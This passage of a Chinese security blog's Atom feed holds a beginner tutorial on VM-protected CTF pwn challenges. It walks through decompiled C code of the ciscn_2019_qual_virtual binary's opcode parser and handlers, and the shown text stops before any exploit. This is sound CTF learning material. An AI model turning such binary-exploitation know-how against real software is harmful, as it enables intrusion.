          el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="二进制" scheme="https://lawliet.ren/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="MIPS" scheme="https://lawliet.ren/tags/MIPS/"/>
    
  </entry>
  
  <entry>
    <title>VMpwn学习</title>
    <link href="https://lawliet.ren/2020/06/04/vmpwn-xue-xi/"/>
    <id>https://lawliet.ren/2020/06/04/vmpwn-xue-xi/</id>
    <published>2020-06-04T10:01:27.000Z</published>
    <updated>2020-08-31T00:26:54.148Z</updated>
    
    <content type="html"><![CDATA[<p>新手向，会讲得比较详细，入门不易</p><a id="more"></a><p>虚拟机保护的题目相比于普通的pwn题逆向量要大许多，需要分析出分析出不同的opcode的功能再从中找出漏洞，实际上，vmpwn的大部分工作量都在逆向中，能分析出虚拟指令集的功能实现，要做出这道题也比较容易了。</p><p>先给出几个概念</p><h4 id="1-虚拟机保护技术"><a href="#1-虚拟机保护技术" class="headerlink" title="1.虚拟机保护技术"></a>1.虚拟机保护技术</h4><p>所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。这段用于翻译伪代码并负责具体执行的子程序就叫作虚拟机VM（好似一个抽象的CPU）。它以一个函数的形式存在，函数的参数就是字节码的内存地址。</p><h4 id="2-VStartVM"><a href="#2-VStartVM" class="headerlink" title="2.VStartVM"></a>2.VStartVM</h4><p>虚拟机的入口函数，对虚拟机环境进行初始化</p><h4 id="3-VMDispather"><a href="#3-VMDispather" class="headerlink" title="3.VMDispather"></a>3.VMDispather</h4><p>解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环</p><h4 id="4-opcode"><a href="#4-opcode" class="headerlink" title="4.opcode"></a>4.opcode</h4><p>程序可执行代码转换成的操作码</p><p>流程图如下</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C1.png" alt="1"></p><p>下面来看题</p><h2 id="0x1-ciscn-2019-qual-virtual"><a href="#0x1-ciscn-2019-qual-virtual" class="headerlink" title="0x1.ciscn_2019_qual_virtual"></a>0x1.ciscn_2019_qual_virtual</h2><p>首先检查保护</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C1.jpg" alt="1"></p><p>无PIE</p><p>拖进IDA分析流程</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C2.jpg" alt="2"></p><p>程序模拟了一个虚拟机，v5，v6，v7分别是stack段，text段和data段，set函数如下</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  _DWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> s<span class="token punctuation">;</span>    ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">;</span>    ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> ptr<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>函数很简单，就不多说了</p><p>分配好各个段之后，首先往一个chunk上读入name，然后让我们输入指令，先写到一个0x400的缓冲区中，然后再写到text段中，store_opcode函数如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">store_opcode</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> v2 <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> s1<span class="token punctuation">;</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"push"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"pop"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"sub"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">34LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"mul"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">35LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">36LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"load"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"save"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>函数接受两个参数，a1为text段的指针，a2为缓冲区的指针，strtok函数原型如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">strtok</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>delim<span class="token punctuation">)</span>str <span class="token operator">--</span> 要被分解成一组小字符串的字符串。delim <span class="token operator">--</span> 包含分隔符的 C 字符串。该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</code></pre><p>程序中的delim为<strong>\n\r\t</strong>，<strong>strtok(a2, delim)</strong>就是以<strong>\n\r\t</strong>分割a2中的字符串</p><p>由下面的if-else语句我们可以知道程序实现了<strong>push,pop,add,sub,mul,div,load,save</strong>这几个功能，每个功能都对应着一个opcode，将每一个opcode存储到函数中分配的一个临时data段中(函数执行完后这个chunk就会被free掉)</p><p>sub_40144E函数如下</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_40144E</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个函数是用来将函数中的临时text段的指令转移到程序中的text段的，每八个字节存储一个opcode，需要注意的是，这里存储opcode的顺序和我们输入指令的顺序是相反的(不过也没啥需要主义的，反正程序是按照我们输入的指令顺序来执行的)。</p><p>write_stack函数如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">write_data</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-24h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> v2 <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> nptr<span class="token punctuation">;</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span>      ptr<span class="token punctuation">[</span>v2<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>和store_opcode函数相比就是去掉了存储opcode的环节，将我们输入的数据存储在stack段中。</p><p>我们再看到execute函数</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_401967</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">0x11LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">push</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x12LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">pop</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x21LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x22LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">sub</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x23LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">mul</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x24LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">div</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x31LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">load</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x32LL</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token function">save</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接受三个参数，a1为text段结构体的指针，a2为stack段结构体的指针，a3为data段结构体的指针</p><p>take_value函数如下</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">take_value</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个就是从text段中取opcode，从后往前取，因为是倒叙存储，所以最后一个opcode就是我们输入的第一个指令。</p><p>取出opcode之后通过switch语句来执行对应的功能，首先看到push函数</p><pre class=" language-c"><code class="language-c">_BOOL8 __fastcall <span class="token function">push</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">0x40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接受两个参数，a1为data段结构体的指针，a2为stack段结构体的指针，push中有两个函数，第一个函数从stack中取值，第二个函数将从stack中取出的值存入data段中</p><p>pop函数</p><pre class=" language-c"><code class="language-c">_BOOL8 __fastcall <span class="token function">pop</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">0X40144E</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>pop函数中的两个函数和push函数相同，只不过参数不一样，将a1和a2的位置调换了一下，push将stack的值放入data段中，pop则将data中的值放入stack段中</p><p>add函数</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>add只接受一个参数，data段结构体的指针</p><p>通过两个tack_value函数从data段中取出两个连续值，然后将两个值的和写入data段</p><p>sub</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token 